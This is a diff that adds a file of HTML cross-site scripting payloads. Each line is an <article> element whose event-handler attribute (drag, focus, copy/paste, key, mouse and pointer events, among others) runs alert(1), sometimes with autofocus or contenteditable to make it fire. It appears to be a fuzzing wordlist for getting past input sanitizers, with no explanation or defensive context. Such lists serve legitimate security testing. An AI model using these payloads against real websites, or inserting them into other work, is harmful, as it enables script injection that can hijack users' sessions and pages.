@@ -1,0 +1,43 @@
+<article draggable="true" ondrag="alert(1)">test</article>
+<article draggable="true" ondragend="alert(1)">test</article>
+<article draggable="true" ondragenter="alert(1)">test</article>
+<article draggable="true" ondragleave="alert(1)">test</article>
+<article draggable="true" ondragstart="alert(1)">test</article>
+<article id=x tabindex=1 onactivate=alert(1)></article>
+<article id=x tabindex=1 onbeforeactivate=alert(1)></article>
+<article id=x tabindex=1 onbeforedeactivate=alert(1)></article><input autofocus>
+<article id=x tabindex=1 ondeactivate=alert(1)></article><input id=y autofocus>
+<article id=x tabindex=1 onfocus=alert(1)></article>
+<article id=x tabindex=1 onfocusin=alert(1)></article>
+<article onafterscriptexecute=alert(1)><script>1</script>
+<article onbeforecopy="alert(1)" contenteditable>test</article>
+<article onbeforecut="alert(1)" contenteditable>test</article>
+<article onbeforepaste="alert(1)" contenteditable>test</article>
+<article onbeforescriptexecute=alert(1)><script>1</script>
+<article onblur=alert(1) tabindex=1 id=x></article><input autofocus>
+<article onclick="alert(1)">test</article>
+<article oncontextmenu="alert(1)">test</article>
+<article oncopy=alert(1) value="XSS" autofocus tabindex=1>test
+<article oncut=alert(1) value="XSS" autofocus tabindex=1>test
+<article ondblclick="alert(1)" autofocus tabindex=1>test</article>
+<article onfocusout=alert(1) tabindex=1 id=x></article><input autofocus>
+<article onkeydown="alert(1)" contenteditable>test</article>
+<article onkeypress="alert(1)" contenteditable>test</article>
+<article onkeyup="alert(1)" contenteditable>test</article>
+<article onmousedown="alert(1)">test</article>
+<article onmouseenter="alert(1)">test</article>
+<article onmouseleave="alert(1)">test</article>
+<article onmousemove="alert(1)">test</article>
+<article onmouseout="alert(1)">test</article>
+<article onmouseover="alert(1)">test</article>
+<article onmouseup="alert(1)">test</article>
+<article onmousewheel=alert(1)>requires scrolling
+<article onpaste="alert(1)" contenteditable>test</article>
+<article onpointerdown=alert(1)>XSS</article>
+<article onpointerenter=alert(1)>XSS</article>
+<article onpointerleave=alert(1)>XSS</article>
+<article onpointermove=alert(1)>XSS</article>
+<article onpointerout=alert(1)>XSS</article>
+<article onpointerover=alert(1)>XSS</article>
+<article onpointerrawupdate=alert(1)>XSS</article>
+<article onpointerup=alert(1)>XSS</article>
